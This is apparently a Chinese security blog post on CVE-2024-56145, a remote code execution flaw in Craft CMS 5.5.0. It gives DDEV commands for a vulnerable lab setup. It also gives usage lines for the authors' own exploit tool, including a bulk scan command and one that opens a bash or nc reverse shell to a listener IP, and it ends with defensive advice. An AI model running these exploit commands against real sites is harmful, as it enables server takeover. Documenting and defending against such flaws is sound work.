#  深度剖析 CVE-2024-56145：Craft CMS 高危漏洞的利用与防御   
云梦DC  云梦安全   2024-12-23 00:39  
  
近日，安全社区披露了一个影响 Craft CMS 的严重漏洞（CVE-2024-56145）。该漏洞源于对用户输入模板路径的处理不当，攻击者可通过精心构造的路径执行任意代码，实现远程代码执行（RCE）。本篇文章将从漏洞原理、利用过程、防御措施三个角度，带您深入了解该漏洞的威胁与应对。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndxZsFvkmpxqdIuYP1zscPk7a30Pss9hnf8CibDV7NaiczVWkpiamRXObKsSF8o7T2FLaOWl7TDqKwb8bVRLgrcZg/640?wx_fmt=png&from=appmsg "")  
  
### 一、漏洞概述  
  
**漏洞编号**  
：CVE-2024-56145**漏洞类型**  
：远程代码执行（RCE）**影响版本**  
：Craft CMS 5.5.0（及可能的其他版本）**漏洞原因**  
：模板路径的输入验证缺失，导致未授权用户可以注入恶意路径并加载执行任意代码。  
  
Craft CMS 是一款广泛应用于内容管理的工具，其易用性和灵活性深受开发者喜爱。然而，本次漏洞揭示了系统在高自由度输入功能上的潜在风险，可能被攻击者滥用来入侵服务器。  
### 二、漏洞利用过程  
  
我们通过自研工具复现了漏洞的利用流程，并发现其攻击方式主要分为以下几步：  
#### 1.漏洞检测  
  
攻击者首先扫描目标站点是否存在漏洞。通常通过发送恶意构造的请求，观察返回的错误信息或响应状态，判断系统是否可被利用。  
#### 2.生成恶意模板路径  
  
利用 Craft CMS 的模板加载机制，攻击者可以通过伪造路径将恶意代码注入到系统的模板解析器中。  
#### 3.执行代码  
  
一旦注入成功，攻击者即可通过反弹 Shell 或其他方式在目标服务器上执行任意代码，达到完全控制目标的目的。  
### 三、复现测试环境  
  
为了方便安全研究人员测试漏洞，我们提供了 Craft CMS 环境搭建的具体步骤。**注：请勿将测试环境用于非法用途！**  
#### 1. 环境要求  
- **操作系统**  
：Linux / macOS / Windows（需支持 Docker 和 DDEV）  
  
- **依赖**  
：Docker、DDEV、PHP 8.2、MySQL 8.0  
  
#### 2. 快速搭建步骤  
```

```  
```
mkdir craft-vuln &&cd craft-vuln# 配置 Craft CMS 项目ddev config \ --project-type=craftcms \ --docroot=web \ --create-docroot \ --php-version="8.2" \ --database="mysql:8.0"# 启动项目ddev start -y# 安装指定版本的 Craft CMSddev composer create -y --no-scripts"craftcms/craft:5.0.0"ddev composer require"craftcms/cms:5.5.0" --no-scripts --with-all-dependencies# 设置安全密钥并完成初始化ddev craft setup/security-key ddev craft install/craft \ --username=admin \ --password=password123 \ --email=admin@example.com \ --site-name=VulnLab \ --language=en \ --site-url='$DDEV_PRIMARY_URL'# 配置 PHP 参数mkdir -p .ddev/php/ &&echo"register_argc_argv = On" > .ddev/php/php.ini ddev restart# 启动浏览器访问ddev launch
```  
  
通过以上命令，您可以快速搭建一个 Craft CMS 测试环境，用于复现漏洞。  
### 四、自研漏洞利用工具功能  
  
针对 CVE-2024-56145，我们开发了一款 CLI 工具，支持漏洞检测与利用：  
#### 1.漏洞检测  
  
该工具支持单目标和多目标的漏洞扫描。  
  
**示例命令**  
：  
  
```
python exploit.py check -f urls.txt -t 10 -o results.txt
```  
  
  
  
参数说明：  
- -f  
：包含目标 URL 的文件路径  
  
- -t  
：线程数量（默认 10）  
  
- -o  
：输出结果保存文件  
  
#### 2.漏洞利用  
  
利用工具可以快速生成恶意模板路径并触发代码执行。  
  
**示例命令**  
：  
  
```
python exploit.py exploit -u https://target.com -lh 192.168.1.100 -lp 4444 -px bash
```  
  
  
  
参数说明：  
- -u  
：目标站点 URL  
  
- -lh  
：本地监听 IP  
  
- -lp  
：监听端口  
  
- -px  
：Payload 类型（支持bash  
、nc  
 等）  
  
### 五、防御与建议  
#### 1.立即升级  
  
Craft CMS 官方已发布补丁，建议用户将系统更新至最新版本，修复漏洞。  
#### 2.输入验证  
  
加强对模板路径等动态输入的验证，防止未授权用户传递恶意路径。  
#### 3.使用 WAF  
  
部署 Web 应用防火墙（WAF），实时监测和拦截可疑请求。  
#### 4.日志审计  
  
定期审计服务器日志，及时发现异常活动。  
  
  
